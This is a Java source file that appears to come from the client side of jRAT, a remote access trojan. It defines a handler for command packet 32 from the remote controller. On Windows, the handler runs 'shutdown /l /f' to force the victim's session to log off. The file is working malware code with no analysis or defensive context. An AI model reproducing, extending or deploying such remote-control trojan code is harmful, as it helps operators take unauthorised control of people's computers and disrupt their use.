package jrat.client.packets.incoming;

import jrat.client.Connection;
import oslib.OperatingSystem;

public class Packet32LockComputer extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown /l /f");
		}
	}

}
